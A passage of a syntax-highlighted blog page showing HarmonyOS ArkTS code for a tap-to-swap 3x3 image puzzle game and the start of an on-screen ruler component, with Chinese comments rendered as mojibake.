class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; fileIo <span class="keyword">as</span> fs &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.CoreFileKit&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; common &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.AbilityKit&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; image &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ImageKit&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; photoAccessHelper &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.MediaLibraryKit&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰æ‹¼å›¾ç»„ä»¶æ¥å£</span></span><br><span class="line">interface <span class="title class_">PuzzlePiece</span> &#123;</span><br><span class="line">  <span class="comment">// æ‹¼å›¾å—çš„åƒç´ åœ°å›¾</span></span><br><span class="line">  <span class="attr">pixelMap</span>: image.<span class="property">PixelMap</span>;</span><br><span class="line">  <span class="comment">// åŸå§‹å›¾ç‰‡ä¸­çš„ç´¢å¼•ä½ç½®</span></span><br><span class="line">  <span class="attr">originalIndex</span>: number;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä½¿ç”¨è£…é¥°å™¨å®šä¹‰é¡µé¢ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Page30</span> &#123;</span><br><span class="line">  <span class="comment">// çŠ¶æ€å˜é‡ï¼šé€‰ä¸­å›¾ç‰‡çš„URI</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">selectedImageUrl</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// çŠ¶æ€å˜é‡ï¼šåŸå§‹å›¾ç‰‡çš„URI</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">originalImageUrl</span>: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">// çŠ¶æ€å˜é‡ï¼šå­˜å‚¨æ‹¼å›¾å—çš„æ•°ç»„</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">puzzlePieces</span>: <span class="title class_">Array</span>&lt;<span class="title class_">PuzzlePiece</span>&gt; = [];</span><br><span class="line">  <span class="comment">// çŠ¶æ€å˜é‡ï¼šè®°å½•å½“å‰é€‰ä¸­çš„æ‹¼å›¾å—ç´¢å¼•</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">selectedPiece</span>: number = -<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¼¹å‡ºå›¾ç‰‡é€‰æ‹©å™¨æ–¹æ³•</span></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">openPicker</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">let</span> <span class="title class_">PhotoSelectOptions</span> = <span class="keyword">new</span> photoAccessHelper.<span class="title class_">PhotoSelectOptions</span>();</span><br><span class="line">      <span class="title class_">PhotoSelectOptions</span>.<span class="property">MIMEType</span> = photoAccessHelper.<span class="property">PhotoViewMIMETypes</span>.<span class="property">IMAGE_TYPE</span>;</span><br><span class="line">      <span class="title class_">PhotoSelectOptions</span>.<span class="property">maxSelectNumber</span> = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">let</span> photoPicker = <span class="keyword">new</span> photoAccessHelper.<span class="title class_">PhotoViewPicker</span>();</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">uris</span>: photoAccessHelper.<span class="property">PhotoSelectResult</span> = <span class="keyword">await</span>  photoPicker.<span class="title function_">select</span>(<span class="title class_">PhotoSelectOptions</span>)</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (!uris || uris.<span class="property">photoUris</span>.<span class="property">length</span> === <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">      <span class="comment">// è·å–é€‰ä¸­å›¾ç‰‡çš„ç¬¬ä¸€å¼ URI</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">uri</span>: string = uris.<span class="property">photoUris</span>[<span class="number">0</span>];</span><br><span class="line">      <span class="comment">// æ‰“å¼€æ–‡ä»¶è¯»å–æµ</span></span><br><span class="line">      <span class="keyword">let</span> file = fs.<span class="title function_">openSync</span>(uri, fs.<span class="property">OpenMode</span>.<span class="property">READ_ONLY</span>);</span><br><span class="line">      <span class="comment">// è·å–å½“å‰ä¸Šä¸‹æ–‡</span></span><br><span class="line">      <span class="keyword">let</span> context = <span class="title function_">getContext</span>(<span class="variable language_">this</span>) <span class="keyword">as</span> common.<span class="property">UIAbilityContext</span>;</span><br><span class="line">      <span class="comment">// æ–°å»ºä¸€ä¸ªä¿å­˜è£å‰ªåå›¾ç‰‡çš„è·¯å¾„</span></span><br><span class="line">      <span class="keyword">let</span> newUrl = context.<span class="property">filesDir</span> + <span class="string">&#x27;/test&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() + <span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">      <span class="comment">// å¤åˆ¶å›¾ç‰‡åˆ°æ–°çš„è·¯å¾„</span></span><br><span class="line">      fs.<span class="title function_">copyFileSync</span>(file.<span class="property">fd</span>, newUrl);</span><br><span class="line">      <span class="comment">// å…³é—­æ–‡ä»¶è¯»å–æµ</span></span><br><span class="line">      fs.<span class="title function_">closeSync</span>(file);</span><br><span class="line">      <span class="comment">// æ›´æ–°çŠ¶æ€å˜é‡ï¼šè®¾ç½®æ˜¾ç¤ºå›¾ç‰‡çš„URI</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">selectedImageUrl</span> = newUrl;</span><br><span class="line">      <span class="comment">// æ›´æ–°çŠ¶æ€å˜é‡ï¼šä¿å­˜åŸå§‹å›¾ç‰‡çš„URI</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">originalImageUrl</span> = uri;</span><br><span class="line">      <span class="comment">// å›¾ç‰‡æ›´æ”¹æ—¶è§¦å‘çš„æ–¹æ³•</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">imgChange</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;openPicker&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å›¾ç‰‡æ›´æ”¹å¤„ç†æ–¹æ³•</span></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">imgChange</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// åˆ›å»ºå›¾ç‰‡æºå¯¹è±¡</span></span><br><span class="line">      <span class="keyword">const</span> <span class="attr">imageSource</span>: image.<span class="property">ImageSource</span> = image.<span class="title function_">createImageSource</span>(<span class="variable language_">this</span>.<span class="property">selectedImageUrl</span>);</span><br><span class="line">      <span class="comment">// å›¾ç‰‡è§£ç é€‰é¡¹</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">decodingOptions</span>: image.<span class="property">DecodingOptions</span> = &#123;</span><br><span class="line">        <span class="attr">editable</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">desiredPixelFormat</span>: <span class="number">3</span>,</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="comment">// åˆ›å»ºåƒç´ åœ°å›¾</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">mPixelMap</span>: image.<span class="property">PixelMap</span> = <span class="keyword">await</span> imageSource.<span class="title function_">createPixelMap</span>(decodingOptions);</span><br><span class="line">      <span class="comment">// è·å–å›¾ç‰‡ä¿¡æ¯</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">mImageInfo</span>: image.<span class="property">ImageInfo</span> = <span class="keyword">await</span> mPixelMap.<span class="title function_">getImageInfo</span>();</span><br><span class="line">      <span class="comment">// è®¡ç®—æ¯ä¸ªæ‹¼å›¾å—çš„å¤§å°</span></span><br><span class="line">      <span class="keyword">const</span> <span class="attr">pieceSize</span>: image.<span class="property">Size</span> = &#123;</span><br><span class="line">        <span class="attr">width</span>: mImageInfo.<span class="property">size</span>.<span class="property">width</span> / <span class="number">3</span>,</span><br><span class="line">        <span class="attr">height</span>: mImageInfo.<span class="property">size</span>.<span class="property">height</span> / <span class="number">3</span>,</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="comment">// æ¸…ç©ºå·²æœ‰æ‹¼å›¾å—æ•°æ®</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="comment">// éå†å›¾ç‰‡ç”Ÿæˆ9ä¸ªæ‹¼å›¾å—</span></span><br><span class="line">      <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">3</span>; row++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">3</span>; col++) &#123;</span><br><span class="line">          <span class="comment">// åˆ›å»ºåŸºäºåŸå›¾çš„æ–°å›¾ç‰‡æº</span></span><br><span class="line">          <span class="keyword">const</span> imageSource = image.<span class="title function_">createImageSource</span>(<span class="variable language_">this</span>.<span class="property">selectedImageUrl</span>);</span><br><span class="line">          <span class="comment">// åˆ›å»ºæ–°åƒç´ åœ°å›¾</span></span><br><span class="line">          <span class="keyword">let</span> mPixelMap = <span class="keyword">await</span> imageSource.<span class="title function_">createPixelMap</span>(decodingOptions);</span><br><span class="line">          <span class="comment">// è®¡ç®—è£å‰ªåŒºåŸŸ</span></span><br><span class="line">          <span class="keyword">const</span> <span class="attr">cutRegion</span>: image.<span class="property">Region</span> = &#123;</span><br><span class="line">            <span class="attr">x</span>: col * pieceSize.<span class="property">width</span>,</span><br><span class="line">            <span class="attr">y</span>: row * pieceSize.<span class="property">height</span>,</span><br><span class="line">            <span class="attr">size</span>: pieceSize,</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="comment">// è£å‰ªåƒç´ åœ°å›¾</span></span><br><span class="line">          <span class="keyword">await</span> mPixelMap.<span class="title function_">crop</span>(cutRegion);</span><br><span class="line">          <span class="comment">// åˆ›å»ºå¹¶æ·»åŠ æ‹¼å›¾å—è‡³æ•°ç»„</span></span><br><span class="line">          <span class="keyword">const</span> <span class="attr">piece</span>: <span class="title class_">PuzzlePiece</span> = &#123;</span><br><span class="line">            <span class="attr">pixelMap</span>: mPixelMap,</span><br><span class="line">            <span class="attr">originalIndex</span>: count++,</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>.<span class="title function_">push</span>(piece);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// æ‰“ä¹±æ‹¼å›¾å—é¡ºåº</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>.<span class="property">length</span> - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">const</span> j = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (i + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">let</span> <span class="attr">temp</span>: <span class="title class_">PuzzlePiece</span> = <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[i];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[i] = <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[j];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[j] = temp;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;imgChange&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(e));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºUIç•Œé¢</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123;</span><br><span class="line">      <span class="comment">// æ·»åŠ é€‰æ‹©å›¾ç‰‡æŒ‰é’®ï¼Œç‚¹å‡»åè°ƒç”¨æ‰“å¼€å›¾ç‰‡é€‰æ‹©å™¨æ–¹æ³•</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;é€‰æ‹©å›¾ç‰‡â†’&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">openPicker</span>();</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="comment">// æ˜¾ç¤ºåŸå§‹å›¾ç‰‡ï¼ˆå¦‚æœå·²é€‰æ‹©ï¼‰</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">originalImageUrl</span>) &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;åŸå§‹å›¾ç‰‡â†“&#x27;</span>);</span><br><span class="line">        <span class="title class_">Image</span>(<span class="variable language_">this</span>.<span class="property">originalImageUrl</span>)</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;180lpx&#x27;</span>)</span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">&#x27;180lpx&#x27;</span>)</span><br><span class="line">          .<span class="title function_">objectFit</span>(<span class="title class_">ImageFit</span>.<span class="property">Contain</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// å¦‚æœæœ‰æ‹¼å›¾å—ï¼Œåˆ™æ˜¾ç¤ºæ¸¸æˆåŒº</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">puzzlePieces</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">&#x27;æ¸¸æˆå›¾ç‰‡â†“&#x27;</span>);</span><br><span class="line">        <span class="comment">// æ¸¸æˆåŒºåŸŸé‡‡ç”¨ç½‘æ ¼å¸ƒå±€</span></span><br><span class="line">        <span class="title class_">Grid</span>() &#123;</span><br><span class="line">          <span class="comment">// éå†æ‰€æœ‰æ‹¼å›¾å—å¹¶åˆ›å»ºç½‘æ ¼é¡¹</span></span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">puzzlePieces</span>, <span class="function">(<span class="params">item: PuzzlePiece, index: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">GridItem</span>() &#123;</span><br><span class="line">              <span class="comment">// æ˜¾ç¤ºæ‹¼å›¾å—å›¾åƒ</span></span><br><span class="line">              <span class="title class_">Image</span>(item.<span class="property">pixelMap</span>)</span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">&#x27;200lpx&#x27;</span>)</span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">&#x27;200lpx&#x27;</span>)</span><br><span class="line">                .<span class="title function_">margin</span>(<span class="string">&#x27;5lpx&#x27;</span>)</span><br><span class="line">                  <span class="comment">// æ ¹æ®æ˜¯å¦é€‰ä¸­è°ƒæ•´ç¼©æ”¾æ¯”ä¾‹</span></span><br><span class="line">                .<span class="title function_">scale</span>(<span class="variable language_">this</span>.<span class="property">selectedPiece</span> == index ? &#123; <span class="attr">x</span>: <span class="number">0.5</span>, <span class="attr">y</span>: <span class="number">0.5</span> &#125; : &#123; <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">1</span> &#125;)</span><br><span class="line">                  <span class="comment">// æ·»åŠ ç‚¹å‡»äº‹ä»¶å¤„ç†</span></span><br><span class="line">                .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                  <span class="comment">// å¤„ç†æ‹¼å›¾äº¤æ¢é€»è¾‘</span></span><br><span class="line">                  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedPiece</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">selectedPiece</span> = index;</span><br><span class="line">                  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedPiece</span> == index) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">selectedPiece</span> = -<span class="number">1</span>;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">let</span> <span class="attr">temp</span>: <span class="title class_">PuzzlePiece</span> = <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[<span class="variable language_">this</span>.<span class="property">selectedPiece</span>];</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[<span class="variable language_">this</span>.<span class="property">selectedPiece</span>] = <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[index];</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[index] = temp;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">selectedPiece</span> = -<span class="number">1</span>;</span><br><span class="line">                    <span class="comment">// æ£€æŸ¥æ‹¼å›¾æ˜¯å¦å®Œæˆ</span></span><br><span class="line">                    <span class="keyword">let</span> <span class="attr">isSucc</span>: boolean = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;====item&#x27;</span>, <span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[i].<span class="property">originalIndex</span>, i);</span><br><span class="line">                      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">puzzlePieces</span>[i].<span class="property">originalIndex</span> !== i) &#123;</span><br><span class="line">                        isSucc = <span class="literal">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// å¦‚æœæ‹¼å›¾å®Œæˆï¼Œå¼¹å‡ºæç¤ºå¯¹è¯æ¡†</span></span><br><span class="line">                    <span class="keyword">if</span> (isSucc) &#123;</span><br><span class="line">                      promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">                        <span class="attr">message</span>: <span class="string">&#x27;æ‹¼å›¾å®Œæˆï¼&#x27;</span>,</span><br><span class="line">                      &#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;) <span class="comment">// End of ForEach</span></span><br><span class="line">        &#125; <span class="comment">// End of Grid</span></span><br><span class="line">        .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#fafafa&quot;</span>); <span class="comment">// è®¾ç½®ç½‘æ ¼èƒŒæ™¯è‰²</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="comment">// End of Column</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// è®¾ç½®åˆ—å®½åº¦ä¸º100%</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ruler"><a href="#ruler" class="headerlink" title="ruler"></a>ruler</h1><p>ç›´å°º</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="variable language_">window</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>; <span class="comment">// å¯¼å…¥çª—å£ç›¸å…³çš„API</span></span><br><span class="line"><span class="keyword">import</span> &#123; deviceInfo &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.BasicServicesKit&#x27;</span>; <span class="comment">// å¯¼å…¥è®¾å¤‡ä¿¡æ¯ç›¸å…³çš„API</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰ç›´å°ºçº¿ç±»</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RulerLine</span> &#123;</span><br><span class="line">  <span class="attr">index</span>: number; <span class="comment">// çº¿çš„ç´¢å¼•</span></span><br><span class="line">  <span class="attr">height</span>: number; <span class="comment">// çº¿çš„é«˜åº¦</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">index: number, height: number</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">index</span> = index; <span class="comment">// åˆå§‹åŒ–ç´¢å¼•</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">height</span> = height; <span class="comment">// åˆå§‹åŒ–é«˜åº¦</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ˜¾ç¤ºçº¿çš„ç¼–å·</span></span><br><span class="line">  <span class="title function_">showNumber</span>(): string &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">index</span> % <span class="number">10</span> === <span class="number">0</span> ? <span class="string">`<span class="subst">$&#123;<span class="built_in">Math</span>.floor(<span class="variable language_">this</span>.index / <span class="number">10</span>)&#125;</span>`</span> : <span class="string">&#x27;&#x27;</span>; <span class="comment">// æ¯10ä¸ªçº¿æ˜¾ç¤ºä¸€ä¸ªç¼–å·</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// æ‰©å±•æ–‡æœ¬æ ·å¼</span></span><br><span class="line">@<span class="title class_">Extend</span>(<span class="title class_">Text</span>)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fancy</span>(<span class="params"></span>) &#123;</span><br><span class="line">  .<span class="title function_">fontColor</span>(<span class="string">&quot;#019dfe&quot;</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">  .<span class="title function_">fontSize</span>(<span class="number">20</span>); <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰ç›´å°ºç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">RulerComponent</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">maxRulerHeight</span>: number = <span class="number">0</span>; <span class="comment">// æœ€å¤§ç›´å°ºé«˜åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;onCellWidthChanged&#x27;</span>) <span class="attr">cellWidthInPixels</span>: number = <span class="number">17.28</span>; <span class="comment">// æ¯æ¯«ç±³å¯¹åº”çš„åƒç´ </span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">textWidth</span>: number = <span class="number">80</span>; <span class="comment">// æ–‡æœ¬å®½åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">rulerLines</span>: <span class="title class_">RulerLine</span>[] = []; <span class="comment">// ç›´å°ºçº¿æ•°ç»„</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">leftOffsetX</span>: number = -<span class="number">300</span>; <span class="comment">// å·¦ä¾§åç§»</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentPositionX</span>: number = -<span class="number">300</span>; <span class="comment">// å½“å‰Xä½ç½®</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;onContainerHeightChanged&#x27;</span>) <span class="attr">containerHeight</span>: number = <span class="number">53</span>; <span class="comment">// å®¹å™¨é«˜åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">originalContainerHeight</span>: number = <span class="number">53</span>; <span class="comment">// åŸå§‹å®¹å™¨é«˜åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;onCellWidthChanged&#x27;</span>) <span class="attr">containerWidth</span>: number = <span class="number">0</span>; <span class="comment">// å®¹å™¨å®½åº¦</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¤„ç†å•å…ƒæ 